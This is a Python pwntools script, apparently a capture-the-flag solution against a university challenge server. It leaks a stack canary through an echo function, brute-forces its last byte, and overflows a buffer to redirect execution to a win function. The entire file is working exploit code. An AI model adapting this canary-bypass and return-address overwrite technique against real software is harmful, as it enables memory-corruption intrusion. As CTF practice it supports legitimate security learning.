from pwn import *

context.terminal = ["konsole", "-e"]

HOST = "cyberchallenge.disi.unitn.it"
PORT = 50200

if args['REMOTE']:
    p = remote(host=HOST, port=PORT )
else:
    p = process("./bin")

canary_offset = 72
payload = b'A' * canary_offset

p.recvuntil(b"3. Exit\n")
p.sendline( b'1')

# Leak canary by overwriting its first byte (0x00) with a newline character
p.sendlineafter(b"Data to be echoed: ", payload)

p.recvline()
p.recvline()

leaked_canary = b"\x00" + p.recv(6)
win_function = 0x00000000004011f6


for i in range (256):
    canary = leaked_canary + bytes([i])
    canary = int.from_bytes(canary, "little")
    print(f"Bruteforcing the canary...Trying with: {hex(canary)}", end='\r')

    payload = b'A' * canary_offset + p64(canary) + b"B" * 8 + p64(win_function)

    p.sendlineafter(b'3. Exit\n', b'2')
    p.sendlineafter(b"Data to be uppercased: ", payload)
    
    p.recvline()
    p.recvline()
    
    if "win" in p.recvline().decode():
        print(f"Canary found: {hex(canary)}")
        p.sendlineafter(b'3. Exit\n', payload)
        p.sendlineafter(b'3. Exit\n', b'3')
        print(p.recvline().decode())
        break
    